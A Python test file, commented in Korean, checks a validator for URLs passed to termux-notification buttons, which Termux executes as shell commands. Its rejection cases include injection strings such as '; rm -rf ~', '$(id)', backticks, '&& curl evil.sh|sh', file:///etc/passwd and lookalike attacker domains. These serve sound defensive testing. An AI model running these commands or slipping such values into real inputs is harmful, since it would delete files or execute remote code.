"""
알림 버튼에 들어가는 주소 검증.

termux-notification 의 --action 값은 Termux 가 셸 명령으로 실행한다.
주소 안의 등록번호/접수번호는 외부 API 에서 오는 값이므로,
그대로 넣으면 임의 명령이 실행될 수 있다.
"""
from __future__ import annotations

import pytest

from app.notify.android import safe_url


@pytest.mark.parametrize("url", [
    "https://clinicaltrials.gov/study/NCT07576868",
    "https://dart.fss.or.kr/dsaf001/main.do?rcpNo=20260903900243",
    "https://www.fda.gov/news-events/press-announcements",
    "http://localhost:8000",
])
def test_정상_주소는_통과한다(url):
    assert safe_url(url) == url


@pytest.mark.parametrize("url", [
    "https://clinicaltrials.gov/study/NCT1; rm -rf ~",          # 명령 이어붙이기
    "https://clinicaltrials.gov/study/$(id)",                    # 명령 치환
    "https://clinicaltrials.gov/study/`whoami`",                 # 역따옴표
    "https://clinicaltrials.gov/study/NCT1 && curl evil.sh|sh",  # 파이프
    "https://clinicaltrials.gov/study/NCT1\nrm -rf ~",           # 줄바꿈
    "https://evil.example.com/study/NCT1",                       # 다른 도메인
    "http://clinicaltrials.gov/study/NCT1",                      # https 아님
    "file:///etc/passwd",
    "javascript:alert(1)",
    "https://clinicaltrials.gov/" + "a" * 400,                   # 지나치게 긴 주소
])
def test_위험한_주소는_막는다(url):
    assert safe_url(url) is None


def test_빈값은_조용히_무시한다():
    assert safe_url(None) is None
    assert safe_url("") is None


def test_비슷해_보이는_도메인도_막는다():
    """clinicaltrials.gov.evil.com 같은 주소에 속으면 안 된다."""
    assert safe_url("https://clinicaltrials.gov.evil.com/study/NCT1") is None
    assert safe_url("https://dart.fss.or.kr.attacker.net/x") is None


def test_하위도메인은_허용한다():
    assert safe_url("https://www.clinicaltrials.gov/study/NCT1") is not None
